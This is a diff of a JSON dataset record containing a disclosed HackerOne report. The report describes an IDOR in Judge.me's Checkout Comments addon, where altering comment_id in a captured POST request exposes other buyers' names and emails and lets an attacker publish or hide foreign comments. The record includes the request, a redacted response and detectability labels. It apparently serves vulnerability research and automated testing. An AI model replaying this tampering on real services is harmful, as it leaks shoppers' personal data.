@@ -1,60 +1,60 @@
 {
-    "reported_to": "Judge.me ",
-    "reported_by": "glister ",
-    "title": "IDOR: leak buyer info & Publish/Hide foreign comments",
-    "content": "\nHI @judgeme!\nI noticed that the attacker can learn email users who left feedback at the time of buying.\nStep to reproduce:\nLogin to our store and install your 'Checkout Comments' addon\nMake fake order in or store and write a comment\n\u2588\u2588\u2588\nThen go to our Shopify /admin/apps/checkout-comments/extensions/checkout_comments/comments\nPublish our comment and Intercept request with burp. Send request to Repeater. Request example:\nPOST /extensions/checkout_comments/curate_comment HTTP/1.1\nHost: judge.me\nCookie: _judgeme_session=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588; _ga=GA1.2.1935027813.1637882690; _gid=GA1.2.2043288340.1637882690; _fbp=fb.1.1637882690590.2069272048; _gat_UA-28424713-2=1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36\nAccept: /\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://judge.me/extensions/checkout_comments/comments?platform=shopify&shop_domain=test-hackerone-glis.myshopify.com&page=3&offset=50\nX-Csrf-Token: \u2588\u2588\u2588\u2588==\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nContent-Length: 23\nOrigin: https://judge.me\nTe: trailers\nConnection: close\ncomment_id=1&curated=ok\nEdit comment_id=random_id and in Response we can see buyer information (for example):\n{\"comment\":{\"id\":1,\"content\":\"classic dress watch for weddings\",\"created_at\":\"over 3 years ago\",\"product\":{\"title\":\"Dress Watch\",\"url\":\"https://\u2588\u2588\u2588\u2588.myshopify.com/products/dress-watch\"},\"buyer\":{\"name\":\"F F\",\"email\":\"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588@gmail.com\"},\"published_status\":true,\"published_status_text\":\"Published\",\"curated\":\"ok\"}}\n\u2588\u2588\u2588\u2588\u2588\u2588\nVideo POC:\n\u2588\u2588\u2588\u2588\u2588\u2588\nImpact\nBuyer information leaks and other\n\n",
-    "severity": [
-        7.5,
-        null
+  "reported_to": "Judge.me ",
+  "reported_by": "glister ",
+  "title": "IDOR: leak buyer info & Publish/Hide foreign comments",
+  "content": "\nHI @judgeme!\nI noticed that the attacker can learn email users who left feedback at the time of buying.\nStep to reproduce:\nLogin to our store and install your 'Checkout Comments' addon\nMake fake order in or store and write a comment\n\u2588\u2588\u2588\nThen go to our Shopify /admin/apps/checkout-comments/extensions/checkout_comments/comments\nPublish our comment and Intercept request with burp. Send request to Repeater. Request example:\nPOST /extensions/checkout_comments/curate_comment HTTP/1.1\nHost: judge.me\nCookie: _judgeme_session=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588; _ga=GA1.2.1935027813.1637882690; _gid=GA1.2.2043288340.1637882690; _fbp=fb.1.1637882690590.2069272048; _gat_UA-28424713-2=1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36\nAccept: /\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://judge.me/extensions/checkout_comments/comments?platform=shopify&shop_domain=test-hackerone-glis.myshopify.com&page=3&offset=50\nX-Csrf-Token: \u2588\u2588\u2588\u2588==\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nContent-Length: 23\nOrigin: https://judge.me\nTe: trailers\nConnection: close\ncomment_id=1&curated=ok\nEdit comment_id=random_id and in Response we can see buyer information (for example):\n{\"comment\":{\"id\":1,\"content\":\"classic dress watch for weddings\",\"created_at\":\"over 3 years ago\",\"product\":{\"title\":\"Dress Watch\",\"url\":\"https://\u2588\u2588\u2588\u2588.myshopify.com/products/dress-watch\"},\"buyer\":{\"name\":\"F F\",\"email\":\"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588@gmail.com\"},\"published_status\":true,\"published_status_text\":\"Published\",\"curated\":\"ok\"}}\n\u2588\u2588\u2588\u2588\u2588\u2588\nVideo POC:\n\u2588\u2588\u2588\u2588\u2588\u2588\nImpact\nBuyer information leaks and other\n\n",
+  "severity": [
+    7.5,
+    null
+  ],
+  "bounty": 1250,
+  "weaknesses": [
+    "Insecure Direct Object Reference (IDOR)"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1648749840,
+  "report_url": "https://hackerone.com/reports/1410498",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Login to the store and install the 'Checkout Comments' addon"
     ],
-    "bounty": 1250,
-    "weaknesses": [
-        "Insecure Direct Object Reference (IDOR)"
+    [
+      2,
+      "Make a fake order and leave a comment"
     ],
-    "screenshots": {},
-    "disclosed_date": 1648749840,
-    "report_url": "https://hackerone.com/reports/1410498",
-    "is_multi_component": false,
-    "complexity": "MEDIUM",
-    "novelty": "MEDIUM",
-    "vuln_category": "WEB_APP",
-    "steps": [
-        [
-            1,
-            "Login to the store and install the 'Checkout Comments' addon"
-        ],
-        [
-            2,
-            "Make a fake order and leave a comment"
-        ],
-        [
-            3,
-            "Navigate to the comments section in the admin panel and publish the comment"
-        ],
-        [
-            4,
-            "Intercept the request with Burp and modify the comment_id parameter to a random ID"
-        ],
-        [
-            5,
-            "Observe the response containing buyer information"
-        ]
+    [
+      3,
+      "Navigate to the comments section in the admin panel and publish the comment"
     ],
-    "vuln_description": "The vulnerability is an Insecure Direct Object Reference (IDOR) that allows an attacker to access sensitive buyer information by manipulating the comment_id parameter in a request. This leads to unauthorized disclosure of personal data such as email addresses and names associated with comments.",
-    "reason": "The attack involves understanding the application flow, intercepting and modifying requests, and recognizing the potential for IDOR. While the steps are straightforward, the need to use tools like Burp and the understanding of request manipulation adds some complexity.",
-    "new_complexity": "MEDIUM",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "idor_detectable": true,
-    "authnz_byppass_detectable": false,
-    "is_simple_payload": false,
-    "injection_metadata": {
-        "is_simple_payload": false
-    },
-    "authnz_metadata": {
-        "idor_detectable": true,
-        "authnz_byppass_detectable": false
-    }
+    [
+      4,
+      "Intercept the request with Burp and modify the comment_id parameter to a random ID"
+    ],
+    [
+      5,
+      "Observe the response containing buyer information"
+    ]
+  ],
+  "vuln_description": "The vulnerability is an Insecure Direct Object Reference (IDOR) that allows an attacker to access sensitive buyer information by manipulating the comment_id parameter in a request. This leads to unauthorized disclosure of personal data such as email addresses and names associated with comments.",
+  "reason": "The attack involves understanding the application flow, intercepting and modifying requests, and recognizing the potential for IDOR. While the steps are straightforward, the need to use tools like Burp and the understanding of request manipulation adds some complexity.",
+  "new_complexity": "MEDIUM",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "idor_detectable": true,
+  "authnz_byppass_detectable": false,
+  "is_simple_payload": false,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves an Insecure Direct Object Reference (IDOR) where an attacker can access buyer information by manipulating the 'comment_id' parameter in a POST request. This fits the methodology's test case e) where substituting the 'resource_id' (comment_id) with another ID and executing it with an existing user session can reveal unauthorized data. The methodology covers this by automatically testing such substitutions.",
+    "is_detectable": true
+  }
 }
